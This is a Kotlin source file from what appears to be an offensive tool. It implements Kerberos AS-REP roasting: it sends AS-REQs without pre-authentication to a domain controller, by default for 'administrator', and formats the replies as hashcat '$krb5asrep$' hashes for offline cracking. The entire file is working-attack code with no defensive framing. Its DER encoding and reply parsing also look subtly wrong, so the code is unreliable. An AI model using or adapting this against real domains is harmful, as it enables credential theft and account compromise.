package com.projectzerodays.quantumcli.ops

import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetSocketAddress
import java.security.SecureRandom

/**
 * Minimal Kerberos AS-REQ/AS-REP roaster (BruteEngineV3.roast parity):
 * sends preauth-less AS-REQs and captures AS-REP enc-parts as hashcat
 * `$krb5asrep$` material for accounts that do not require preauthentication.
 */
object Kerberos {

    // ---------------------------------------------------------------- DER
    private object Der {
        fun tlv(tag: Int, content: ByteArray): ByteArray {
            val len = content.size
            val lenBytes: ByteArray = when {
                len < 0x80 -> byteArrayOf(len.toByte())
                len < 0x100 -> byteArrayOf(0x81.toByte(), len.toByte())
                len < 0x10000 -> byteArrayOf(0x82.toByte(), (len ushr 8).toByte(), len.toByte())
                else -> byteArrayOf(
                    0x83.toByte(), (len ushr 16).toByte(), (len ushr 8).toByte(), len.toByte()
                )
            }
            return byteArrayOf(tag.toByte()) + lenBytes + content
        }

        fun cat(vararg parts: ByteArray): ByteArray = parts.reduce { a, b -> a + b }

        fun seq(vararg parts: ByteArray): ByteArray = tlv(0x30, cat(*parts))
        fun ctxCon(n: Int, vararg parts: ByteArray): ByteArray = tlv(0xA0 + n, cat(*parts))
        fun ctxPrim(n: Int, content: ByteArray): ByteArray = tlv(0x80 + n, content)

        fun intBytes(v: Long): ByteArray {
            if (v == 0L) return byteArrayOf(0x00)
            var n = v
            val bytes = ArrayList<Byte>()
            while (n != 0L) {
                bytes.add(0, (n and 0xFF).toByte())
                n = n ushr 8
            }
            var out = bytes.toByteArray()
            if (v > 0 && (out[0].toInt() and 0x80) != 0) {
                out = byteArrayOf(0x00) + out
            }
            return out
        }

        fun int(v: Long): ByteArray = tlv(0x02, intBytes(v))
        fun gStr(s: String): ByteArray = tlv(0x1B, s.toByteArray(Charsets.US_ASCII))
    }

    private class Node(val tag: Int, val content: ByteArray) {
        fun children(): List<Node> {
            val out = ArrayList<Node>()
            var i = 0
            while (i < content.size) {
                val tag = content[i].toInt() and 0xFF
                if (tag == 0) break
                i++
                if (i >= content.size) break
                var len = content[i].toInt() and 0xFF
                i++
                if (len and 0x80 != 0) {
                    val n = len and 0x7F
                    len = 0
                    for (j in 0 until n) {
                        if (i >= content.size) return out
                        len = (len shl 8) or (content[i].toInt() and 0xFF)
                        i++
                    }
                }
                if (i + len > content.size) break
                out.add(Node(tag, content.copyOfRange(i, i + len)))
                i += len
            }
            return out
        }

        fun first(tag: Int): Node? = children().firstOrNull { it.tag == tag }

        fun intValue(): Long {
            var v = 0L
            for (b in content) v = (v shl 8) or (b.toLong() and 0xFF)
            return v
        }

        fun ascii(): String = String(content, Charsets.US_ASCII)
        fun hex(): String = Net.hex(content)
    }

    private fun parseTop(bytes: ByteArray): Node? {
        if (bytes.size < 2) return null
        val tag = bytes[0].toInt() and 0xFF
        var i = 1
        var len = bytes[i].toInt() and 0xFF
        i++
        if (len and 0x80 != 0) {
            val n = len and 0x7F
            len = 0
            for (j in 0 until n) {
                if (i >= bytes.size) return null
                len = (len shl 8) or (bytes[i].toInt() and 0xFF)
                i++
            }
        }
        if (i + len > bytes.size) return null
        return Node(tag, bytes.copyOfRange(i, i + len))
    }

    // ---------------------------------------------------------------- AS-REQ
    private fun principal(nameType: Long, vararg names: String): ByteArray = Der.seq(
        Der.ctxPrim(0, Der.intBytes(nameType)),
        Der.ctxCon(1, Der.cat(*names.map { Der.gStr(it) }.toTypedArray()))
    )

    private fun buildAsReq(user: String, realm: String): ByteArray {
        val pvno = Der.ctxPrim(0, Der.intBytes(5))
        val msgType = Der.ctxPrim(1, Der.intBytes(10))
        val kdcOptions = Der.ctxPrim(0, byteArrayOf(0x00, 0, 0, 0, 0))
        val cname = Der.ctxCon(1, principal(1, user))
        val realmTag = Der.ctxPrim(2, realm.toByteArray(Charsets.US_ASCII))
        val sname = Der.ctxCon(3, principal(2, "krbtgt", realm))
        val till = Der.ctxPrim(5, "20370101000000Z".toByteArray(Charsets.US_ASCII))
        val nonce = Der.ctxPrim(7, Der.intBytes(SecureRandom().nextLong().ushr(33)))
        val etypes = Der.ctxCon(8, Der.cat(Der.int(23), Der.int(18), Der.int(17)))
        val reqBody = Der.seq(kdcOptions, cname, realmTag, sname, till, nonce, etypes)
        return Der.tlv(0x6A, Der.seq(pvno, msgType, Der.ctxCon(4, reqBody)))
    }

    /**
     * AS-REP roast: returns hashcat `$krb5asrep$` hashes for accounts that
     * answer without preauth; empty list when the KDC requires preauth or is
     * unreachable.
     */
    fun asrepRoast(ip: String, realm: String, user: String = "administrator"): List<String> {
        val out = ArrayList<String>()
        val req = buildAsReq(user, realm.uppercase())
        try {
            DatagramSocket().use { s ->
                s.soTimeout = 5000
                s.send(DatagramPacket(req, req.size, InetSocketAddress(ip, 88)))
                val buf = ByteArray(65535)
                val rx = DatagramPacket(buf, buf.size)
                s.receive(rx)
                val resp = parseTop(buf.copyOfRange(0, rx.length)) ?: return out
                when (resp.tag) {
                    0x6B -> {
                        // AS-REP: [3] crealm, [4] cname, [6] enc-part (EncryptedData)
                        val crealm = resp.first(0x83)
                        val cname = resp.first(0xA4)
                        val encPart = resp.first(0xA6) ?: return out
                        val etype = encPart.first(0xA0)?.intValue() ?: 23L
                        val cipherNode = encPart.first(0xA2) ?: return out
                        val userStr = cname?.first(0xA1)?.children()
                            ?.firstOrNull()?.ascii() ?: user
                        val realmStr = crealm?.ascii() ?: realm.uppercase()
                        out.add("\$krb5asrep\$$etype\$$userStr@$realmStr:${cipherNode.hex()}")
                    }
                    // 0x6E = KDC-ERR: PREAUTH_REQUIRED or PRINCIPAL_UNKNOWN — no hash
                    else -> {}
                }
            }
        } catch (e: Exception) {
            // KDC unreachable or malformed reply; roast yields nothing
        }
        return out
    }
}
